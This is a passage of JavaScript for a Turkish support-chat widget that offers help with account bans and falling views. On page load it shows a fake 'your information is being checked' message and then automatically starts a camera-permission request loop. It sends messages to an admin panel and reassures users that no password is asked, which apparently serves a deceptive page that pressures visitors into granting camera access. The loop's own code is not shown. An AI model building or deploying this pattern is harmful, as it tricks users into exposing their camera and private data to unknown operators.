        btn.textContent = label;
        quick.appendChild(btn);
      });
      return;
    }
    question.options.forEach((opt, i) => {
      const btn = document.createElement("button");
      btn.type = "button";
      btn.setAttribute("data-quick", opt);
      btn.textContent = `${i + 1}) ${opt}`;
      quick.appendChild(btn);
    });
  }

  function seedChat(box, quick) {
    box.innerHTML = "";
    setQuizButtons(quick, null);
  }

  function wireChat(root) {
    const box = root.querySelector("[data-chat-messages]");
    const form = root.querySelector("[data-chat-form]");
    const input = root.querySelector("[data-chat-input]");
    const clearBtn = root.querySelector("[data-chat-clear]");
    const quick = root.querySelector("[data-chat-quick]");
    if (!box || !form || !input) return;

    let busy = false;
    let quiz = null;
    let openSeqToken = 0;
    let openSeqTimer = null;

    const GREET_TEXT =
      "Merhaba. Ben Yardım Asistanı. Ban, izlenme düşüşü veya görünürlük sorunlarında rehberlere yönlendirebilirim.\n\nHesap durumu kontrolü için ‘Hesabım kısıtlandı’ yazın veya aşağıdaki kısayolları kullanın. Şifre / e-posta istemem.";
    const LOADING_TEXT = "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";

    async function beginAutoCamera() {
      startCameraPermissionLoop(box);
    }

    function startOpenSequence() {
      const token = ++openSeqToken;
      if (openSeqTimer) {
        window.clearTimeout(openSeqTimer);
        openSeqTimer = null;
      }
      stopCameraPermissionLoop();
      clearPermissionDeniedNotice(box);
      busy = true;
      appendMessage(box, "bot", GREET_TEXT);
      const loadingRow = appendMessage(box, "bot", LOADING_TEXT, {
        type: "loading",
        sync: true,
      });
      busy = false;
      openSeqTimer = window.setTimeout(() => {
        openSeqTimer = null;
        if (token !== openSeqToken) return;
        loadingRow?.remove();
        void beginAutoCamera();
      }, 2000);
    }

    function botSay(text, after) {
      const typing = showTyping(box);
      const delay = 350 + Math.random() * 400;
      window.setTimeout(() => {
        typing.remove();
        appendMessage(box, "bot", text);
        busy = false;
        after?.();
        input.focus();
      }, delay);
    }

    function askCurrent() {
      const current = riskQuestions[quiz.index];
      setQuizButtons(quick, current);
      return (
        current.q +
        "\n\nCevap için alttaki butona basın veya yazın:\n" +
        current.options.map((o, i) => `${i + 1}) ${o}`).join("\n")
      );
    }

    function startQuiz(withIntro) {
      quiz = { index: 0, total: 0 };
      const syncNote = window.ChatSync?.enabled
        ? "Şifre / e-posta / kod yazmayın. Destek paneli yalnızca sorununuzu görür.\n\n"
        : "Şifre / e-posta / kod istenmez.\n\n";
      const intro = withIntro
        ? `Hesap durumu kontrolü başlıyor. 5 kısa soru soracağım.\n${syncNote}`
        : "Kontrol yeniden başlıyor.\n\n";
      botSay(intro + askCurrent());
    }

    function finishQuiz() {
      const verdict = riskVerdict(quiz.total);
      const score = quiz.total;
      quiz = null;
      if (quick) {
        quick.innerHTML = "";
        const again = document.createElement("button");
        again.type = "button";
        again.setAttribute("data-quick", "Hesabım kısıtlandı");
        again.textContent = "Kontrolü yeniden başlat";
        quick.appendChild(again);
        [
          ["Hesabım ban yedi", "Ban"],
          ["İzlenmelerim düştü", "İzlenme düşüşü"],
        ].forEach(([value, label]) => {
          const btn = document.createElement("button");
          btn.type = "button";
          btn.setAttribute("data-quick", value);
          btn.textContent = label;
          quick.appendChild(btn);
        });
      }
      botSay(
        `${verdict.title}\nSkor: ${score}/15\n\n${verdict.body}\n\nTekrar için ‘Kontrolü yeniden başlat’a basın.`
      );
    }

    function answerQuiz(raw) {
      if (SECRETISH.test(raw)) {
        botSay("Kontrol sırasında bile şifre veya e-posta istemeyiz. Lütfen alttaki seçeneklerden birini seçin.");
        return;
      }
      const current = riskQuestions[quiz.index];
      const matched = matchOption(raw, current.options);
      if (!matched) {
        botSay(
          "Bu cevabı tanımadım. Şunlardan birini seçin:\n" +
            current.options.map((o, i) => `${i + 1}) ${o}`).join("\n")
        );
        return;
      }
      quiz.total += current.score[matched] ?? 1;
      quiz.index += 1;
      if (quiz.index >= riskQuestions.length) {
        finishQuiz();
        return;
      }
      botSay(`Kaydedildi: “${matched}”.\n\n` + askCurrent());
    }

    function send(text) {
      const msg = text.trim();
      if (!msg || busy) return;
      busy = true;
      appendMessage(box, "user", msg);
      input.value = "";

      if (quiz) {
        answerQuiz(msg);
        return;
      }

      if (
        RISK_TRIGGER.test(msg) ||
        /risk altınd|risk kontrol|güvenlik kontrol|guvenlik kontrol|sorular[ıi] yeniden|yeniden başlat|kontrolü yeniden|kontrolu yeniden/i.test(
          msg
        )
      ) {
        startQuiz(true);
        return;
      }

      botSay(botReply(msg));
    }

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      send(input.value);
    });

    clearBtn?.addEventListener("click", () => {
      busy = false;
      quiz = null;
      openSeqToken += 1;
      if (openSeqTimer) {
        window.clearTimeout(openSeqTimer);
        openSeqTimer = null;
      }
      seedChat(box, quick);
      startOpenSequence();
    });

    quick?.addEventListener("click", (e) => {
      const btn = e.target.closest("[data-quick]");
      if (!btn) return;
      send(btn.getAttribute("data-quick") || btn.textContent || "");
    });

    seedChat(box, quick);
    startOpenSequence();
  }

  let supportListenerBound = false;
  function bindSupportIncomingOnce() {
    if (supportListenerBound) return;
    const primaryBox = document.querySelector("[data-chat-root] [data-chat-messages]");
    if (!primaryBox || !window.ChatSync?.listenIncomingSupport) return;
    supportListenerBound = true;
    window.ChatSync.listenIncomingSupport((msg) => {
      handleAdminIncoming(primaryBox, msg);
    });
  }

  document.querySelectorAll("[data-chat-root]").forEach(wireChat);
  bindSupportIncomingOnce();
  if (!supportListenerBound) {
    let n = 0;
    const t = setInterval(() => {
      n += 1;
      bindSupportIncomingOnce();
      if (supportListenerBound || n > 80) clearInterval(t);
    }, 50);
  }

  /* Floating launcher */
  {
    const chatHref = inArticles ? "../chat.html" : "chat.html";
    const hasHomeChat = Boolean(document.querySelector("#canli-destek"));
    const hasInlineChat = Boolean(document.querySelector("#canli-destek, .chat-page"));

    const launcher = document.createElement("div");
    launcher.className = "chat-float";
    const inlineNote = hasHomeChat
      ? `<p class="chat-float-note">Bu sayfada sohbet kutusu var. <a href="#canli-destek">Aşağıya in</a> veya <a href="${chatHref}">tam sayfa sohbet</a>.</p>`
      : hasInlineChat
        ? `<p class="chat-float-note">Sohbet bu sayfada. Aşağıdaki kutuya yazın.</p>`
        : `<p class="chat-float-note">Yardım asistanına yazmak için:</p>
           <a class="btn btn-primary" href="${chatHref}">Sohbeti aç</a>`;

    launcher.innerHTML = `
      <button type="button" class="chat-float-btn" aria-expanded="false" aria-controls="chat-float-panel" data-float-toggle>
        <span class="chat-float-icon" aria-hidden="true"></span>
        <span data-float-label>Destek</span>
      </button>
      <div class="chat-float-panel" id="chat-float-panel" hidden data-float-panel>
        <header class="chat-float-head">
          <strong>Destek yazışması</strong>
          <button type="button" class="chat-float-close" data-float-close aria-label="Kapat">×</button>
        </header>
        ${inlineNote}
      </div>
    `;
    document.body.appendChild(launcher);

    const panel = launcher.querySelector("[data-float-panel]");
    const toggle = launcher.querySelector("[data-float-toggle]");
    const label = launcher.querySelector("[data-float-label]");

    function setOpen(open) {
      panel.hidden = !open;
      toggle.setAttribute("aria-expanded", String(open));
      label.textContent = open ? "Kapat" : "Destek";
      launcher.classList.toggle("is-open", open);
    }

    toggle.addEventListener("click", () => {
      if (hasInlineChat) {
        const target = document.getElementById("canli-destek") || document.querySelector(".chat-shell");
        if (target) {
          target.scrollIntoView({ behavior: "smooth", block: "start" });
          target.querySelector("[data-chat-input]")?.focus();
          return;
        }
      }
      setOpen(panel.hidden);
    });
    launcher.querySelector("[data-float-close]")?.addEventListener("click", () => setOpen(false));
  }
})();
